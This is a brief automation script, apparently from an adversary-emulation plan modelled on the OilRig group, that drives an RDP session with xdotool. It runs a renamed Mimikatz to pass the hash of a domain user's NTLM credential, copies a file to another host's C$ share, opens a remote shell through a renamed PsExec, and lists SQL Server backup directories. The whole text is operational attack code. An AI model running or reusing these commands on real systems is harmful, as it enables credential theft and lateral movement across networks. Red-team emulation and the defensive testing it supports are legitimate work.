scripts.command:
sleep 5;
rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
rdp_window=$(xdotool search --pid "$rdp_pid");
xdotool key --window "$rdp_window" Super_L;
sleep 5; 
xdotool windowactivate --sync "$rdp_window" type --delay 200 "cmd";
sleep 3; 
xdotool key --window "$rdp_window" Ctrl+Shift+Return;
sleep 3; 
xdotool key --window "$rdp_window" Tab Tab;
xdotool key --window "$rdp_window" Return;
sleep 3; 
xdotool type --window "$rdp_window" 'C:\Windows\System32\mom64.exe "privilege::debug" "sekurlsa::pth /user:#{ctid_oilrig_second_target_user} /domain:#{ctid_oilrig_network_domain_name} /ntlm:#{ctid_oilrig_second_target_ntlm}"';
xdotool key --window "$rdp_window" Return;
sleep 3; 
xdotool type --window "$rdp_window" 'copy C:\Windows\Temp\Nt.dat \\#{ctid_oilrig_third_target_ip}\C$\ProgramData\';
xdotool key --window "$rdp_window" Return;
sleep 3; 
xdotool type --window "$rdp_window" 'C:\Windows\System32\ps.exe \\#{ctid_oilrig_third_target_ip} cmd.exe';
xdotool key --window "$rdp_window" Return;
sleep 5;

sleep 3;
rdp_pid=$(pgrep -f "xfreerdp.*/v:localhost");
rdp_window=$(xdotool search --pid "$rdp_pid");
sleep 3; 
xdotool type --window "$rdp_window" 'dir "C:\Program Files\Microsoft SQL Server\"';
xdotool key --window "$rdp_window" Return;
sleep 3; 
xdotool type --window "$rdp_window" 'dir "C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Backup\"';
xdotool key --window "$rdp_window" Return;
sleep 4;
